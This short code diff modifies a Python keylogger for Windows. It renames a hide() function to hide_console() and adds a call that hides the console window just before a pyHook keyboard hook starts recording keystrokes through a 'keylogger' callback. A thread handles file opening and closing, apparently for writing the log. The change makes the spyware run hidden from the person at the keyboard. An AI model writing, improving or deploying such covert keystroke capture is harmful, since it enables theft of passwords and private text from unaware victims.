@@ -17,7 +17,7 @@ psapi=windll.psapi
 
 currentwindow=None
 edata=None
-def hide():
+def hide_console():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
     return True
@@ -92,7 +92,7 @@ def keylogger(event):
     return True
 
 threading.Thread(target=controller).start() #  Thread to handle the opening and Closing of File
-
+hide_console()
 kl=pyHook.HookManager()
 kl.KeyDown=keylogger
 kl.HookKeyboard()
